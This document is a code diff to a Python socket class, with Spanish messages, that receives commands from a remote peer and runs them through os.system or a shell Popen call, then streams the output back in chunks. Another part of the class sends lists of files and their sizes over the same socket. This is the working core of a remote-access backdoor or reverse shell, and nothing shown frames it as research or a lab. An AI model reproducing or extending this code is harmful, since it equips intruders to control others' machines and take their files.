@@ -87,10 +87,10 @@ class TCP:
 
         sleep(0.2)
         tam = len(archivos)
-        if index > tam:
-            index = 1
         self.__sock.send(str(tam).encode())
 
+        if index > tam:
+            index = 1
         while index <= tam:
             nombre = self.getNombre(archivos[index-1])
             peso = os.path.getsize(archivos[index-1])
@@ -320,17 +320,22 @@ class TCP:
 
                 else:
                     try:
-                        comando = Popen(cmd, shell=PIPE, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-                        info = comando.stdout.read() + comando.stderr.read()
-
-                        if info == b'':
+                        if cmd.lower()[:4] == "open":
+                            os.system(cmd.lower())
                             self.__sock.send("[+] Comando ejecutado".encode())
 
                         else:
-                            i = 0
-                            while i < len(info):
-                                self.__sock.send(info[i:i+self.__chunk])
-                                i += self.__chunk
+                            comando = Popen(cmd, shell=PIPE, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+                            info = comando.stdout.read() + comando.stderr.read()
+
+                            if info == b'':
+                                self.__sock.send("[+] Comando ejecutado".encode())
+
+                            else:
+                                i = 0
+                                while i < len(info):
+                                    self.__sock.send(info[i:i+self.__chunk])
+                                    i += self.__chunk
 
                     except:
                         continue
